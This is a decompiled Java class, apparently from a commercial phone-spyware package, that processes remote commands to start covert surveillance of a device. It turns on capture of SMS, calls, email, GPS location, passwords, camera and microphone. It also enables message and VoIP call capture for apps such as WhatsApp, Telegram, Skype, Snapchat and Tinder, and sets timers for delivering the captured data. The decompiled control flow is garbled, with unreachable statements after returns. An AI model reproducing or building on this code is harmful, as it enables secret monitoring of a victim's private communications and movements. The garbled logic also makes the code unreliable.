package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.appengine.i;
import com.vvt.base.FeatureId;
import com.vvt.configurationmanager.c;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.preference.PrefIMCaptureSettings;
import com.vvt.preference.PrefVoipCallRecordingCaptureSettings;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import java.util.List;
import java.util.Map;

public class bz
{
  private static final boolean a = a.a;
  
  private long a(int paramInt)
  {
    long l;
    switch (paramInt)
    {
    default: 
      l = -1;
    }
    for (;;)
    {
      return l;
      l = 10000L;
      continue;
      l = 30000L;
      continue;
      l = 60000L;
      continue;
      l = 300000L;
      continue;
      l = 600000L;
      continue;
      l = 1200000L;
      continue;
      l = 2400000L;
      continue;
      l = 3600000L;
    }
  }
  
  private FeatureId a(RemoteFunction paramRemoteFunction)
  {
    Object localObject = ca.a;
    int i = paramRemoteFunction.ordinal();
    int j = localObject[i];
    switch (j)
    {
    default: 
      boolean bool = a;
      if (bool) {}
      bool = false;
      localObject = null;
    }
    for (;;)
    {
      return (FeatureId)localObject;
      localObject = FeatureId.CAPTURE_CALLLOG;
      continue;
      localObject = FeatureId.CAPTURE_SMS;
      continue;
      localObject = FeatureId.CAPTURE_EMAIL;
      continue;
      localObject = FeatureId.CAPTURE_LOCATION;
      continue;
      localObject = FeatureId.CAPTURE_IM;
      continue;
      localObject = FeatureId.CAPTURE_MMS;
      continue;
      localObject = FeatureId.CAPTURE_CAMERAIMAGE;
      continue;
      localObject = FeatureId.CAPTURE_SOUND_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_VIDEO_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_WALLPAPER;
      continue;
      localObject = FeatureId.CAPTURE_APPLICATION;
      continue;
      localObject = FeatureId.CAPTURE_BROWSER_URL;
      continue;
      localObject = FeatureId.CAPTURE_CALENDAR;
      continue;
      localObject = FeatureId.CAPTURE_CALL_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_PASSWORD;
      continue;
      localObject = FeatureId.CAPTURE_VOIP_CALLLOG;
      continue;
      localObject = FeatureId.CAPTURE_CONTACT;
      continue;
      localObject = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
    }
  }
  
  private void a(FeatureId paramFeatureId, AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture, PrefIMCaptureSettings paramPrefIMCaptureSettings, PrefVoipCallRecordingCaptureSettings paramPrefVoipCallRecordingCaptureSettings, Map paramMap)
  {
    Object localObject = ca.b;
    int i = paramFeatureId.ordinal();
    int j = localObject[i];
    switch (j)
    {
    }
    for (;;)
    {
      return;
      i.d(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.e(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.h(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      i.c(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.g(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramMap);
      i.c(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      localObject = paramh;
      i.a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramPrefVoipCallRecordingCaptureSettings, paramMap);
      i.c(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      localObject = paramh;
      i.a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramPrefIMCaptureSettings, paramMap);
      i.c(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.f(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.i(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.j(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.k(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.l(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.n(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.m(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.p(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.o(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.q(paramh, paramList, paramBoolean, paramPrefEventsCapture);
      continue;
      i.a(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    }
  }
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramh.n;
    Object localObject2 = FxPreferenceType.EVENTS_CTRL;
    PrefEventsCapture localPrefEventsCapture = (PrefEventsCapture)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    localObject2 = FxPreferenceType.IM_CAPTURE_SETTINGS;
    PrefIMCaptureSettings localPrefIMCaptureSettings = (PrefIMCaptureSettings)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    localObject2 = FxPreferenceType.VOIP_CALLRECORDING_CAPTURE_SETTINGS;
    PrefVoipCallRecordingCaptureSettings localPrefVoipCallRecordingCaptureSettings = (PrefVoipCallRecordingCaptureSettings)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    localObject2 = i.b(paramh);
    List localList = ((c)localObject2).b();
    Map localMap = ((c)localObject2).c();
    localObject2 = paramh.k;
    ProductInfoImpl localProductInfoImpl = paramh.o;
    Object localObject3 = paramh.l.d();
    boolean bool3 = ((com.vvt.license.b)localObject2).a(localProductInfoImpl, (String)localObject3);
    localObject3 = paramControlCommand.getFunction();
    localObject2 = paramControlCommand.getData();
    Object localObject4 = RemoteFunction.ENABLE_EVENT_CAPTURE;
    boolean bool4;
    if (localObject3 == localObject4)
    {
      bool4 = localObject2 instanceof Boolean;
      if (bool4)
      {
        localObject2 = (Boolean)localObject2;
        bool4 = a;
        if (bool4) {}
        bool1 = ((Boolean)localObject2).booleanValue();
        localPrefEventsCapture.setCaptureEnabled(bool1);
        ((com.vvt.preference.b)localObject1).b();
        bool1 = a;
        if (bool1) {}
        localObject2 = paramh;
        i.a(paramh, localList, bool3, localPrefEventsCapture, localPrefIMCaptureSettings, localPrefVoipCallRecordingCaptureSettings, localMap);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return true;
      localObject4 = RemoteFunction.SET_GPS_TIME_INTERVAL;
      boolean bool2;
      if (localObject3 == localObject4)
      {
        boolean bool5 = localObject2 instanceof Integer;
        if (bool5)
        {
          localObject2 = (Integer)localObject2;
          int i = ((Integer)localObject2).intValue();
          long l1 = a(i);
          localPrefEventsCapture.setGpsTrackingIntervalMs(l1);
          ((com.vvt.preference.b)localObject1).b();
          bool2 = a;
          if (bool2) {}
          i.g(paramh, localList, bool3, localPrefEventsCapture);
        }
      }
      else
      {
        localObject4 = RemoteFunction.ENABLE_VOIP_CALL_RECORDING;
        boolean bool6;
        if (localObject3 == localObject4)
        {
          localObject2 = (Map)localObject2;
          localObject4 = a((RemoteFunction)localObject3);
          localObject3 = Integer.valueOf(37);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(37);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefEventsCapture.setCapture((FeatureId)localObject4, bool4);
          }
          localObject3 = Integer.valueOf(401);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(401);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefVoipCallRecordingCaptureSettings.setFacebookVoipCallRecordingCaptureEnabled(bool4);
          }
          localObject3 = Integer.valueOf(410);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(410);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefVoipCallRecordingCaptureSettings.setHangoutVoipCallRecordingCaptureEnabled(bool4);
          }
          localObject3 = Integer.valueOf(404);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(404);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefVoipCallRecordingCaptureSettings.setLineVoipCallRecordingCaptureEnabled(bool4);
          }
          localObject3 = Integer.valueOf(400);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(400);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefVoipCallRecordingCaptureSettings.setSkypeVoipCallRecordingCaptureEnabled(bool4);
          }
          localObject3 = Integer.valueOf(402);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(402);
            localObject3 = (Boolean)((Map)localObject2).get(localObject3);
            bool4 = ((Boolean)localObject3).booleanValue();
            bool6 = a;
            if (bool6) {}
            localPrefVoipCallRecordingCaptureSettings.setViberVoipCallRecordingCaptureEnabled(bool4);
          }
          localObject3 = Integer.valueOf(403);
          bool4 = ((Map)localObject2).containsKey(localObject3);
          if (bool4)
          {
            localObject3 = Integer.valueOf(403);
            localObject2 = (Boolean)((Map)localObject2).get(localObject3);
            bool2 = ((Boolean)localObject2).booleanValue();
            bool4 = a;
            if (bool4) {}
            localPrefVoipCallRecordingCaptureSettings.setWhatsAppVoipCallRecordingCaptureEnabled(bool2);
          }
          ((com.vvt.preference.b)localObject1).b();
          localObject3 = this;
          localObject1 = paramh;
          a((FeatureId)localObject4, paramh, localList, bool3, localPrefEventsCapture, localPrefIMCaptureSettings, localPrefVoipCallRecordingCaptureSettings, localMap);
        }
        else
        {
          localObject4 = RemoteFunction.ENABLE_CAPTURE_IM;
          if (localObject3 == localObject4)
          {
            localObject2 = (Map)localObject2;
            localObject4 = a((RemoteFunction)localObject3);
            localObject3 = Integer.valueOf(8);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(8);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefEventsCapture.setCapture((FeatureId)localObject4, bool4);
            }
            localObject3 = Integer.valueOf(204);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(204);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setBBMCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(202);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(202);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setFacebookCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(211);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(211);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setHangoutCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(201);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(201);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setLineCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(203);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(203);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setSkypeCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(206);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(206);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setViberCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(208);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(208);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setWeChatCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(200);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(200);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setWhatsAppCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(209);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(209);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setYahooMessengerCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(210);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(210);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setSnapchatCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(213);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(213);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setKikMessengerCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(214);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(214);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setTelegramCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(215);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(215);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setTinderCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(217);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(217);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setInstagramCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(216);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(216);
              localObject3 = (Boolean)((Map)localObject2).get(localObject3);
              bool4 = ((Boolean)localObject3).booleanValue();
              bool6 = a;
              if (bool6) {}
              localPrefIMCaptureSettings.setQQCaptureEnabled(bool4);
            }
            localObject3 = Integer.valueOf(218);
            bool4 = ((Map)localObject2).containsKey(localObject3);
            if (bool4)
            {
              localObject3 = Integer.valueOf(218);
              localObject2 = (Boolean)((Map)localObject2).get(localObject3);
              bool2 = ((Boolean)localObject2).booleanValue();
              bool4 = a;
              if (bool4) {}
              localPrefIMCaptureSettings.setHikeCaptureEnabled(bool2);
            }
            ((com.vvt.preference.b)localObject1).b();
            localObject3 = this;
            localObject1 = paramh;
            a((FeatureId)localObject4, paramh, localList, bool3, localPrefEventsCapture, localPrefIMCaptureSettings, localPrefVoipCallRecordingCaptureSettings, localMap);
          }
          else
          {
            boolean bool7;
            if (localObject3 != null)
            {
              bool7 = localObject2 instanceof Boolean;
              if (bool7)
              {
                localObject4 = a((RemoteFunction)localObject3);
                localObject2 = (Boolean)localObject2;
                bool2 = ((Boolean)localObject2).booleanValue();
                localPrefEventsCapture.setCapture((FeatureId)localObject4, bool2);
                ((com.vvt.preference.b)localObject1).b();
                bool2 = a;
                if (bool2) {}
                localObject3 = this;
                localObject1 = paramh;
                a((FeatureId)localObject4, paramh, localList, bool3, localPrefEventsCapture, localPrefIMCaptureSettings, localPrefVoipCallRecordingCaptureSettings, localMap);
                continue;
              }
            }
            localObject4 = RemoteFunction.SET_IM_ATTACHMENT_LIMIT_SIZE;
            if (localObject3 == localObject4)
            {
              bool7 = localObject2 instanceof RmtCtrlInputImAttachmentLimitSize;
              if (bool7)
              {
                localObject4 = a((RemoteFunction)localObject3);
                localObject2 = (RmtCtrlInputImAttachmentLimitSize)localObject2;
                long l2 = ((RmtCtrlInputImAttachmentLimitSize)localObject2).getImAttchmentLimitSize(0).longValue();
                localPrefIMCaptureSettings.setImageAttachmentSizeLimit(l2);
                l2 = ((RmtCtrlInputImAttachmentLimitSize)localObject2).getImAttchmentLimitSize(1).longValue();
                localPrefIMCaptureSettings.setAudioAttachmentSizeLimit(l2);
                localObject3 = ((RmtCtrlInputImAttachmentLimitSize)localObject2).getImAttchmentLimitSize(2);
                l2 = ((Long)localObject3).longValue();
                localPrefIMCaptureSettings.setVideoAttachmentSizeLimit(l2);
                int j = 3;
                localObject2 = ((RmtCtrlInputImAttachmentLimitSize)localObject2).getImAttchmentLimitSize(j);
                l2 = ((Long)localObject2).longValue();
                localPrefIMCaptureSettings.setNonMediaAttachmentSizeLimit(l2);
                ((com.vvt.preference.b)localObject1).b();
                bool2 = a;
                if (bool2) {}
                localObject3 = this;
                localObject1 = paramh;
                a((FeatureId)localObject4, paramh, localList, bool3, localPrefEventsCapture, localPrefIMCaptureSettings, localPrefVoipCallRecordingCaptureSettings, localMap);
              }
            }
          }
        }
      }
    }
  }
  
  public boolean b(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.preference.b localb = paramh.n;
    Object localObject1 = FxPreferenceType.EVENTS_CTRL;
    localObject1 = (PrefEventsCapture)localb.a((FxPreferenceType)localObject1);
    List localList = i.b(paramh).b();
    Object localObject2 = paramh.k;
    ProductInfoImpl localProductInfoImpl = paramh.o;
    Object localObject3 = paramh.l.d();
    boolean bool2 = ((com.vvt.license.b)localObject2).a(localProductInfoImpl, (String)localObject3);
    localObject3 = paramControlCommand.getFunction();
    localObject2 = paramControlCommand.getData();
    RemoteFunction localRemoteFunction = RemoteFunction.ENABLE_EVENT_DELIVERY;
    boolean bool3;
    if (localObject3 == localRemoteFunction)
    {
      bool3 = localObject2 instanceof Boolean;
      if (bool3)
      {
        localObject2 = (Boolean)localObject2;
        boolean bool4 = ((Boolean)localObject2).booleanValue();
        ((PrefEventsCapture)localObject1).setDeliverEnabled(bool4);
        localb.b();
        bool4 = a;
        if (bool4) {}
        i.b(paramh, localList, bool2, (PrefEventsCapture)localObject1);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return true;
      localRemoteFunction = RemoteFunction.SET_EVENT_TIMER;
      if (localObject3 == localRemoteFunction)
      {
        bool3 = localObject2 instanceof Integer;
        if (bool3)
        {
          localObject2 = (Integer)localObject2;
          int i = ((Integer)localObject2).intValue();
          ((PrefEventsCapture)localObject1).setDeliverTimer(i);
          localb.b();
          boolean bool5 = a;
          if (bool5) {}
          i.b(paramh, localList, bool2, (PrefEventsCapture)localObject1);
        }
      }
      else
      {
        localRemoteFunction = RemoteFunction.SET_EVENT_MAX_NUMBER;
        if (localObject3 == localRemoteFunction)
        {
          bool3 = localObject2 instanceof Integer;
          if (bool3)
          {
            localObject2 = (Integer)localObject2;
            int j = ((Integer)localObject2).intValue();
            ((PrefEventsCapture)localObject1).setTriggerNumber(j);
            localb.b();
            boolean bool6 = a;
            if (bool6) {}
            i.b(paramh, localList, bool2, (PrefEventsCapture)localObject1);
          }
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bz.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */